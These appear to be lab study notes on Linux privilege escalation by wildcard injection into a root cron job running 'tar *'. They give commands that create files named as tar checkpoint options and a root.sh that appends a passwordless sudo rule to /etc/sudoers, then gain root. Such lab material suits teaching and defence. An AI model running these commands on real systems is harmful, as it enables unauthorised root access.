
## What is a Wildcard?

A **wildcard** is a symbol that the shell uses to match filenames.

Some examples:

|Symbol|Meaning|
|---|---|
|`*`|matches **everything** (any file names)|
|`?`|matches **one** character|
|`[a-z]`|matches **one letter in that range**|
|`~`|means **home directory**|

## The Trick: Using Wildcards to Trick `tar`
The `tar` command is used to compress files (make archives).

It has a special hidden feature in its **manual (`man tar`)**:
```sh
--checkpoint=1
--checkpoint-action=exec=sh root.sh
```

This tells tar to:
    Make a checkpoint every 1 file it processes.
    Then execute a command: sh root.sh
If a cron job is using tar * to archive everything in a folder, we can abuse that * wildcard to make it run our own fake filenames that behave like command-line options.


___

### 🧨 The Scenario: Cron Job Running as Root

There’s a cron job (automated task) like this:
```sh
`*/1 * * * * cd /home/htb-student && tar -zcf backup.tar.gz *`
```
It runs `tar *` every minute, as **root**, to back up files.
That `*` means: include all files in the folder.
You can sneak in fake files that:
- Act like options: `--checkpoint`, `--checkpoint-action`
- Run your script: `root.sh`

### 🧪 The Attack Step-by-Step

1. **Create a malicious script** (root.sh):
```sh
`echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh`
```

> This gives you **sudo with no password**.

2. **Create fake tar options as filenames**:
```sh
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh root.sh"
```

Now, in your folder you have:
- `--checkpoint=1` (fake file)
- `--checkpoint-action=exec=sh root.sh` (another fake file)
- `root.sh` (real malicious script)

3. **Wait for the cron job to run again.**
It sees `*`, so it includes all these "files". But really, they're treated as **options**, so the `tar` command ends up **running your script** as **root**!

### 🧑‍💻 After the Cron Job Runs

You check your sudo permissions:
```bash
sudo -l
```

And boom 💥 — it says:

```sh
(root) NOPASSWD: ALL
```

Now you can do:

```sh
sudo su
```

And you're root.